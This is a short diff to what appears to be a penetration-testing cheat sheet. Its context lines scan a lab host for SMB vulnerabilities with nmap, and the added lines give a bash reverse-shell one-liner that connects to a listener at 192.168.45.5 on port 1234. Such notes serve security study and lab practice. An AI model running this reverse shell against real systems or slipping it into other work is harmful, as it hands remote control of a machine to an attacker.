@@ -74,3 +74,7 @@ nmap --script smb-vuln* -p 445 10.10.10.4
 ```
 ls /usr/share/nmap/scripts/ | grep smb | grep vuln
 ```
+Bash Reverse Shell:
+```
+bash -c 'bash -i >& /dev/tcp/192.168.45.5/1234 0>&1'
+```
